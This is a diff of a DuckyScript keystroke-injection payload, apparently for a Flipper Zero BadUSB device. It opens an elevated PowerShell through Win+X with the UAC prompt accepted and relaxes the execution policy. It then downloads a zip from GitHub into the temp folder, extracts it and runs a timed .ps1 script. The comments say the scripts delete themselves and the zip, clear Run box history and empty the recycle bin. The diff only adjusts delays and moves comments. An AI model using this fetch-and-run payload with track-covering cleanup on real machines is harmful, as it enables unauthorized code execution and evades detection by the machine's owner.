@@ -30,16 +30,32 @@ REM  It seemed easier after messing with PS commands for almost an entire month.
 REM  I could not have done any of this without inspiration from these three Titans and the entire f0 community. Thanks to all of you for inspiring me to undertake this project.
 
 
+
+
+REM There are multiple .ps1 scripts in the zip file. they all start with t, the next character designates (h)ours, (m)minutes or (s)econds.  example 'ts30.ps1' = 30sec. delay. I pre-made 5 second, 30 sec, 1 minute, 30 min, 1 hour and 3 hrs. None of them are set to repeat but if anyone wants I can add that or you can edit the .ps1 file and change the value of x in the expression $n='x' to alter the repeat quantity.
+REM all of the files will delete themselves after the script reaches its end. They will also delete the zip file, clear run box history and empty the recycle bin.
+REM Also included is t1.ps1 so you can verify things are being cleaned up without having to sit through the entire script 
+ 
+REM to use replace Wait for Mouse option change < .\'t*.ps1' > to < .\'Wm.ps1' >. Currently delay after Mouse movement is set for 5min. after mouse movement is detected.
+
+
+
+
+
+
+
+
+
 REM Enter as admin to spawn an admin Powershell 
 DELAY 1000
 GUI m
-DELAY 800
+DELAY 2000
 GUI x
-DELAY 100
+DELAY 1500
 a
-DELAY 500
+DELAY 1500
 ALT y
-DELAY 200
+DELAY 2000
                          
 STRING Set-ExecutionPolicy RemoteSigned -Scope Process
 ENTER
@@ -47,16 +63,14 @@ DELAY 500
 STRING A
 ENTER
 DELAY 500
-STRING $D=$env:tmp;iwr https://github.com/luciferseamus/HackerTyper/raw/refs/heads/main/t.zip -OutFile "$D\t.zip";Expand-Archive $D\t.zip -Des "$D\t" -Force;cd $D\t;.\'ts5.ps1';
+STRING $D=$env:tmp;iwr 'https://github.com/luciferseamus/HackerTyper/raw/refs/heads/main/t.zip' -OutFile "$D\t.zip";Expand-Archive $D\t.zip -Des "$D\t" -Force;cd $D\t;.\'ts5.ps1';
 ENTER
+DELAY 2000
 EXIT
 ENTER
 REM Delay is currently set for 5 seconds
 
-REM There are multiple .ps1 scripts in the zip file. they all start with t, the next character designates (h)ours, (m)minutes or (s)econds.  example 'ts30.ps1' = 30sec. delay. I pre-made 5 second, 30 sec, 1 minute, 30 min, 1 hour and 3 hrs. None of them are set to repeat but if anyone wants I can add that or you can edit the .ps1 file and change the value of x in the expression $n='x' to alter the repeat quantity.
-REM all of the files will delete themselves after the script reaches its end. They will also delete the zip file, clear run box history and empty the recycle bin.
-REM Also included is t1.ps1 so you can verify things are being cleaned up without having to sit through the entire script 
- 
-REM to use replace Wait for Mouse option change < .\'t*.ps1' > to < .\'Wm.ps1' >. Currently delay after Mouse movement is set for 5min. after mouse movement is detected.
+
+
 
 
